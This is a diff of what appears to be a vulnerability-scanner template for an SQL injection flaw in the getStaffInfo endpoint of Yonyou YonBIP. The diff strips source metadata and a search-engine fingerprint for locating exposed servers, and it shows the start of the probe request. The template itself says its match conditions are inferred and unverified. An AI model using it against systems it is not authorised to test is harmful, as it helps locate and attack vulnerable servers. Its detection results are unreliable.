@@ -3,14 +3,8 @@ info:
   name: 用友YonBIP高级版getStaffInfo存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gywir0v2f4pd2ngr
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gywir0v2f4pd2ngr
-    fofa: + hunter`web.body="/nccloud/resources/uap/rbac/login/main/index.html"`
 http:
 - raw:
   - 'GET /ncchr/attendstaff/getStaffInfo?id=1 HTTP/1.1
